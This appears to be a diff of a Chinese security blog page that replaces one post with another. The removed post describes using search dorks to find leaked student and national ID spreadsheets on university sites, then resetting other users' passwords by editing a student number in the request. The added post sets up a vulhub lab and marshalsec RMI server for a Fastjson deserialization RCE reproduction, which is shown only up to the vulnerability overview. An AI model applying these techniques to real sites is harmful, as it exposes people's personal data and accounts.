@@ -3,36 +3,36 @@
 <html class="article-header-style-default">
 <head>
 	
-	<title>记一次从信息泄露到密码重置-挖掘思路 - 回梦&#39;s Blog</title>
+	<title>Fastjson RCE漏洞复现 - 回梦&#39;s Blog</title>
 	<meta charset="utf-8">
 	
 		<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 	
-	<meta name="description" content="起因在挖EDUSRC的时候无意中点到的一个站点  当看到初始密码为8位生日的时候，立即想到了信息收集 信息收集思路12Site:xx.edu.cn filetype:xls 学号 身份证Site:xx.edu.cn xls 学号 身份证 假如xls文件没有，可以尝试搜索其他文件 如：doc、docx、xlsx、pdf、zip、7z等等 在一波搜索下，终于找到了一处信息泄露，搜索到的是一处xls文件">
+	<meta name="description" content="但行好事，莫问前程 docker配置12345678910111213141516171819202122232425262728293031323334#dokcer安装，以ubuntu为例sudo apt install docker.io#安装docker-composesudo apt install docker-compose# 下载项目wget https:&#x2F;&#x2F;github.com&#x2F;">
 <meta property="og:type" content="article">
-<meta property="og:title" content="记一次从信息泄露到密码重置-挖掘思路">
-<meta property="og:url" content="http://example.com/2020/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/index.html">
+<meta property="og:title" content="Fastjson RCE漏洞复现">
+<meta property="og:url" content="http://example.com/2020/08/20/Fastjson-RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html">
 <meta property="og:site_name" content="回梦&#39;s Blog">
-<meta property="og:description" content="起因在挖EDUSRC的时候无意中点到的一个站点  当看到初始密码为8位生日的时候，立即想到了信息收集 信息收集思路12Site:xx.edu.cn filetype:xls 学号 身份证Site:xx.edu.cn xls 学号 身份证 假如xls文件没有，可以尝试搜索其他文件 如：doc、docx、xlsx、pdf、zip、7z等等 在一波搜索下，终于找到了一处信息泄露，搜索到的是一处xls文件">
+<meta property="og:description" content="但行好事，莫问前程 docker配置12345678910111213141516171819202122232425262728293031323334#dokcer安装，以ubuntu为例sudo apt install docker.io#安装docker-composesudo apt install docker-compose# 下载项目wget https:&#x2F;&#x2F;github.com&#x2F;">
 <meta property="og:locale">
-<meta property="og:image" content="http://example.com/2020/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/1.png">
-<meta property="og:image" content="http://example.com/2020/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/2.png">
-<meta property="og:image" content="http://example.com/2020/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/3.png">
-<meta property="og:image" content="http://example.com/2020/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/4.png">
-<meta property="og:image" content="http://example.com/2020/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/5.png">
-<meta property="og:image" content="http://example.com/2020/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/6.png">
-<meta property="og:image" content="http://example.com/2020/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/7.png">
-<meta property="og:image" content="http://example.com/2020/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/8.png">
-<meta property="og:image" content="http://example.com/2020/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/9.png">
-<meta property="og:image" content="http://example.com/2020/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/10.png">
-<meta property="og:image" content="http://example.com/2020/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/11.png">
-<meta property="article:published_time" content="2020-01-19T09:22:19.000Z">
-<meta property="article:modified_time" content="2021-01-19T10:39:39.549Z">
+<meta property="og:image" content="http://example.com/2020/08/20/Fastjson-RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png">
+<meta property="og:image" content="http://example.com/2020/08/20/Fastjson-RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.png">
+<meta property="og:image" content="http://example.com/2020/08/20/Fastjson-RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/7.png">
+<meta property="og:image" content="http://example.com/2020/08/20/Fastjson-RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/8.png">
+<meta property="og:image" content="http://example.com/2020/08/20/Fastjson-RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/9.png">
+<meta property="og:image" content="http://example.com/2020/08/20/Fastjson-RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/3.png">
+<meta property="og:image" content="http://example.com/2020/08/20/Fastjson-RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/5.png">
+<meta property="og:image" content="http://example.com/2020/08/20/Fastjson-RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/6.png">
+<meta property="og:image" content="http://example.com/2020/08/20/Fastjson-RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/4.png">
+<meta property="og:image" content="http://example.com/2020/08/20/Fastjson-RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/11.png">
+<meta property="og:image" content="http://example.com/2020/08/20/Fastjson-RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/10.png">
+<meta property="og:image" content="http://example.com/2020/08/20/Fastjson-RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/12.png">
+<meta property="article:published_time" content="2020-08-20T15:06:56.000Z">
+<meta property="article:modified_time" content="2021-01-21T11:41:26.542Z">
 <meta property="article:author" content="John Doe">
-<meta property="article:tag" content="渗透测试">
-<meta property="article:tag" content="SRC">
+<meta property="article:tag" content="漏洞复现">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/2020/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/1.png">
+<meta name="twitter:image" content="http://example.com/2020/08/20/Fastjson-RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png">
 
 	<meta name="theme-color" content="#00bfff">
 	<meta name="theme-color-rgb" content="0,191,255">
@@ -595,13 +595,13 @@
 	<article class="post post-full card bg-white shadow-sm border-0 ">
 	<header class="post-header text-center">
 		
-		<a class="post-title" href="/2020/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/">记一次从信息泄露到密码重置-挖掘思路</a>
+		<a class="post-title" href="/2020/08/20/Fastjson-RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">Fastjson RCE漏洞复现</a>
 		<div class="post-meta">
 			
 						
 						<div class="post-meta-detail post-meta-detail-time">
 							<i class="fa fa-clock-o" aria-hidden="true"></i>
-							<time title="发布于 2020-1-19 17:22:19 | 编辑于 2021-1-19 18:39:39">2020-1-19 17:22
+							<time title="发布于 2020-8-20 23:06:56 | 编辑于 2021-1-21 19:41:26">2020-8-20 23:06
 							</time>
 						</div>
 					
@@ -610,7 +610,7 @@
 						
 						<div class="post-meta-detail post-meta-detail-categories">
 							<i class="fa fa-bookmark-o" aria-hidden="true"></i>
-							<a class="post-meta-detail-catagory-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+							<a class="post-meta-detail-catagory-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a>
 						</div>
 					
 						
@@ -628,7 +628,7 @@
 						
 						<div class="post-meta-detail post-meta-detail-words">
 							<i class="fa fa-file-word-o" aria-hidden="true"></i>
-							129 字
+							1.3k 字
 						</div>
 					
 						
@@ -636,7 +636,7 @@
 						
 						<div class="post-meta-detail post-meta-detail-readingtime">
 							<i class="fa fa-hourglass-end" aria-hidden="true"></i>
-							1 分钟
+							5 分钟
 						</div>
 					
 		</div>
@@ -644,46 +644,69 @@
 	</header>
 
 	<div class="post-content" id="post_content">
-		<h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><p>在挖EDUSRC的时候无意中点到的一个站点</p>
-<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/2020/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/1.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
+		<p>但行好事，莫问前程</p>
+<h1 id="docker配置"><a href="#docker配置" class="headerlink" title="docker配置"></a>docker配置</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">dokcer安装，以ubuntu为例</span></span><br><span class="line">sudo apt install docker.io</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">安装docker-compose</span></span><br><span class="line">sudo apt install docker-compose</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 下载项目</span></span><br><span class="line">wget https://github.com/vulhub/vulhub/archive/master.zip -O vulhub-master.zip</span><br><span class="line">unzip vulhub-master.zip</span><br><span class="line">cd vulhub-master</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 进入某一个漏洞/环境的目录</span></span><br><span class="line">cd flask/ssti</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 自动化编译环境</span></span><br><span class="line">docker-compose build</span><br><span class="line">1、启动docker服务</span><br><span class="line">service docker start</span><br><span class="line">2、生成自启动服务</span><br><span class="line">systemctl enable docker.service</span><br><span class="line">3、查看服务状态，Active状态为：active（running）</span><br><span class="line">systemctl status docker.service</span><br><span class="line">需要把用户添加到docker用户组</span><br><span class="line">sudo gpasswd -a $&#123;USER&#125; docker</span><br><span class="line">4.重启docker</span><br><span class="line">sudo systemctl restart docker</span><br><span class="line">5.进入新的会话，再重新编译即可</span><br><span class="line">newgrp - docker</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 启动整个环境</span></span><br><span class="line">docker-compose up -d</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">测试完成后，删除整个环境</span></span><br><span class="line">docker-compose down -v</span><br></pre></td></tr></table></figure>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/2020/08/20/Fastjson-RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
 
-<p>当看到初始密码为8位生日的时候，立即想到了信息收集</p>
-<h1 id="信息收集思路"><a href="#信息收集思路" class="headerlink" title="信息收集思路"></a>信息收集思路</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Site:xx.edu.cn filetype:xls 学号 身份证</span><br><span class="line">Site:xx.edu.cn xls 学号 身份证</span><br></pre></td></tr></table></figure>
-<p>假如xls文件没有，可以尝试搜索其他文件</p>
-<p>如：doc、docx、xlsx、pdf、zip、7z等等</p>
-<p>在一波搜索下，终于找到了一处信息泄露，搜索到的是一处xls文件，带有学号和身份证等信息</p>
-<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/2020/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/2.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
+<p>下载完成，访问ip:8090即可</p>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/2020/08/20/Fastjson-RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
 
-<p>拿到了身份证和学号，当即去尝试登录。对头，还是初始密码，成功登录</p>
-<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/2020/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/3.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
+<h1 id="安装Maven"><a href="#安装Maven" class="headerlink" title="安装Maven"></a>安装Maven</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">下载</span></span><br><span class="line">wget https://mirrors.bfsu.edu.cn/apache/maven/maven-3/3.6.3/binaries/apache-maven-3.6.3-bin.tar.gz</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">创建一个目录进行存放</span></span><br><span class="line">mkdir /opt/maven</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">解压</span></span><br><span class="line">tar zxvf apache-maven-3.6.3-bin.tar.gz -C /opt/maven/</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">配置环境变量</span></span><br><span class="line">vim /etc/profile</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">在最下面增加</span></span><br><span class="line">export MAVEN_HOME=/opt/maven/apache-maven-3.6.3</span><br><span class="line">export PATH=$MAVEN_HOME/bin:$PATH</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">使修改的配置立刻生效</span></span><br><span class="line">source /etc/profile</span><br></pre></td></tr></table></figure>
+<p>验证是否安装成功</p>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/2020/08/20/Fastjson-RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/7.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
 
-<p>可以查看个人敏感信息和账号任意操作，在看个人资料的那里尝试找了一下越权漏洞发现没有，就辗转到了修改密码的地方</p>
-<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/2020/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/4.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
+<p>出现这种情况，使用以下命令</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install maven</span><br></pre></td></tr></table></figure>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/2020/08/20/Fastjson-RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/8.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
 
-<p>填好密码，抓了一下包看看</p>
-<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/2020/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/5.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
+<h1 id="安装RMI服务"><a href="#安装RMI服务" class="headerlink" title="安装RMI服务"></a>安装RMI服务</h1><p>使用marshalsec项目，启动RMI服务，监听9999端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/mbechler/marshalsec.git</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> marshalsec/</span><br><span class="line"></span><br><span class="line"><span class="comment">#编译项目</span></span><br><span class="line"></span><br><span class="line">mvn clean package -DskipTests</span><br></pre></td></tr></table></figure>
+<p>编译成功</p>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/2020/08/20/Fastjson-RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/9.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
 
-<p>可以看到带有学号，试想假如修改成别人的学号是不是能修改别人的密码呢，不多说开干</p>
-<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/2020/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/6.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
+<h1 id="Fastjson-lt-1-2-24反序列化RCE漏洞-CNVD-2017-02833"><a href="#Fastjson-lt-1-2-24反序列化RCE漏洞-CNVD-2017-02833" class="headerlink" title="Fastjson &lt;=1.2.24反序列化RCE漏洞(CNVD-2017-02833)"></a>Fastjson &lt;=1.2.24反序列化RCE漏洞(CNVD-2017-02833)</h1><h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>fastjson在解析json的过程中,支持使用@type字段来指定反序列化的类型,并调用该类的set/get方法来访问属性,当组件开启了autotype功能并且反序列化不可信数据时,攻击者可以构造数据,使目标应用的代码执行流程进入特定类的特定setter或者getter方法中,即可构造出一些恶意利用链。在Fastjson 1.2.47及以下版本中,利用其缓存机制可实现对未开启autotype功能的绕过。详细的原理分析:<a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/208339.html">https://www.freebuf.com/vuls/208339.html</a></p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Fastjson1.2.24以及之前的所有版本</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>可以使用圈子社区的工具进行扫描</p>
